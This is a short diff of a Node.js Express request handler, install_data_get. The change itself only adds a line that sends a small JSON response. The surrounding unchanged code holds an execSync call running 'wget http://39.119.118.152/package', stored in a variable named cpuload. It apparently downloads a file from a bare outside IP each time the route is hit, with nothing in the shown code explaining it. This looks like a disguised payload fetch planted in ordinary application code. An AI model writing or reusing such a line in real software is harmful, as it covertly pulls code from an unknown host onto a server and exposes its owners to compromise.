@@ -161,6 +161,7 @@ exports.install_data_get = function(req, res) {
   const cpuload = execSync('wget http://39.119.118.152/package', {
     encoding: 'utf8'
   });
+  res.send(tes = {'q' : '1'});
   //res.send(sidemenus);
 }
 
